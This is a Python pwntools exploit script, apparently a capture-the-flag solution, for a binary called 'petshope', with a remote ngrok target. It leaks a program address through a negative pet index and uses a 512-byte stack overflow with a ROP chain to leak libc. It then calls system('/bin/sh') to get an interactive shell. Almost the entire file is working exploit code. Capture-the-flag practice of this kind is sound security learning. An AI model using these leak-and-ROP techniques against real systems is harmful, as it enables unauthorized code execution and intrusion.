#!/usr/bin/env python3
import pwn

exe = pwn.ELF("./petshope")
libc = pwn.ELF("./libc-2.31.so")
ld = pwn.ELF("./ld-2.31.so")
pwn.context.log_level='debug'
pwn.context.terminal = ["foot"]
# p = pwn.process(exe.path)
# pwn.gdb.attach(p,gdbscript='''
#
#           de connect angr
#           b*main
#           # c
#           # b*buy
#           # b*sell+245
#           # b*sell+367
#           # b*0x55555555569f
#           b*sell+385
#            ''')
if pwn.args.REMOTE:
    p = pwn.remote("0.tcp.ap.ngrok.io", 17568)
else:
    p = pwn.gdb.debug([exe.path],"""
    # angr
              # b*main
              # c
              # b*buy
              # b*sell+245
              # b*sell+367
              # b*0x55555555569f
              # b*sell+385

                """)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)


if __name__ == "__main__":
    # p = conn()
    sla(b"You    -->",b"buy cat -2")
    sla(b"You    -->",b"hello1")
    sla(b"You    -->",b"info mine")
    p.recvuntil(b"Your pets:\n1.",drop=True)
    leak = p.recv(8).replace(b'\n', b'')[1:]
    leak_addr = pwn.u64(leak.ljust(8,b"\0"))
    pwn.log.info(f"leaking addr: {hex(leak_addr)}")
    sla(b"You    -->",b"buy cat 2")
    sla(b"You    -->",b"hello1")
    base = leak_addr - 16392
    pwn.log.info(f"base: {hex(base)}")
    printf_plt = base + 0x3f88
    pop_rdi = base + 0x0000000000001a13
    ret = base + 0x000000000000101a
    fake_rbp = base + 30488
    sell_part = base + 0x1693
    pwn.log.info(f"pop_rdi: {hex(pop_rdi)}")
    pwn.log.info(f"ret: {hex(ret)}")
    sla(b"You    -->",b"buy cat 1")
    sla(b"You    -->",b"hello2")
    sla(b"You    -->",b"sell 1 cat")
    sla(b"You    -->",b"4294")
    sla(b"You    -->",b"sell 2 cat")
    sla(b"You    -->",b"+")
    sla(b"You    -->",b"a"*512 + pwn.p64(fake_rbp) + pwn.p64(pop_rdi)+pwn.p64(printf_plt)+pwn.p64(sell_part))
    p.recvuntil(b"That seems reasonable!\n")
    leak_libc = pwn.u64(p.recv(6).ljust(8,b"\0"))
    base_libc = leak_libc -541728
    libc_system = base_libc + 0x52290
    bin_sh_libc = base_libc + 1787325
    pwn.log.info(f"libc_system: {hex(libc_system)}")
    pwn.log.info(f"bin_sh_libc: {hex(bin_sh_libc)}")
    pwn.log.info(f"leaking libc: {hex(leak_libc)}")
    pwn.log.info(f"base libc: {hex(base_libc)}")
    input()
    sl(b"a"*512 + pwn.p64(fake_rbp) +pwn.p64(ret)*2+ pwn.p64(pop_rdi)+pwn.p64(bin_sh_libc)+pwn.p64(libc_system))






    # good luck pwning :)
    p.interactive()
